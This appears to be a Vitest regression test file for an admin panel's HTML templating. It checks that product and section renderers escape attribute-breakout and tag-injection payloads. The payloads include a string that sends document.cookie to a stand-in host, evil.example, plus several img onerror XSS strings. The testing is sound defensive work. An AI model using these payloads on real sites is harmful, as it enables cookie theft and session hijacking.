import { describe, it, expect } from 'vitest';
import {
  renderProductFormFieldValues,
  renderProductRow,
  renderSectionFormFieldValues,
  renderSectionRow,
} from '../src/js/admin/admin-templates.js';

// Regression guard for /cso Finding #3: sanitizeInput() only strips <tags>,
// it does not escape quote characters -- so a value with no angle brackets
// at all (e.g. `x" onload="...`) sailed through it untouched and broke out
// of the surrounding HTML attribute (value=, alt=, title=) when rendered.
// These payloads deliberately contain NO '<' or '>' to prove that escaping
// (not sanitizeInput) is what closes the hole.

const attrBreakoutPayload = `x" onload="fetch('//evil.example/c?'+document.cookie)`;
const tagPayload = '<img src=x onerror=alert(1)>';

describe('renderProductFormFieldValues', () => {
  it('escapes a quote-breakout payload in the name value attribute', () => {
    const { name } = renderProductFormFieldValues({ name: attrBreakoutPayload, description: '' });
    expect(name).not.toContain('" onload="');
    expect(name).toContain('&quot; onload=&quot;');
  });

  it('handles no editing product', () => {
    const { name, description } = renderProductFormFieldValues(null);
    expect(name).toBe('');
    expect(description).toBe('');
  });
});

describe('renderProductRow', () => {
  it('escapes a quote-breakout payload in the image alt attribute', () => {
    const html = renderProductRow({ id: '1', name: attrBreakoutPayload, description: '', primary_image_url: '' }, 'قسم');
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });

  it('escapes a raw tag payload in the name/description text nodes', () => {
    const html = renderProductRow({ id: '1', name: tagPayload, description: tagPayload, primary_image_url: '' }, 'قسم');
    expect(html).not.toContain(tagPayload);
  });

  it('escapes an attribute-breakout payload in the image src (defense in depth)', () => {
    const html = renderProductRow({ id: '1', name: 'منتج', description: '', primary_image_url: '"><img src=x onerror=alert(3)>' }, 'قسم');
    expect(html).not.toContain('"><img src=x onerror=alert(3)>');
  });
});

describe('renderSectionFormFieldValues', () => {
  it('escapes a quote-breakout payload in the name value attribute', () => {
    const { name } = renderSectionFormFieldValues({ name: attrBreakoutPayload, description: '' });
    expect(name).not.toContain('" onload="');
    expect(name).toContain('&quot; onload=&quot;');
  });
});

describe('renderSectionRow', () => {
  it('escapes a quote-breakout payload in the description title attribute', () => {
    const html = renderSectionRow({ id: '1', name: 'قسم', description: attrBreakoutPayload, icon_name: 'laundry.svg' }, 0);
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });
});
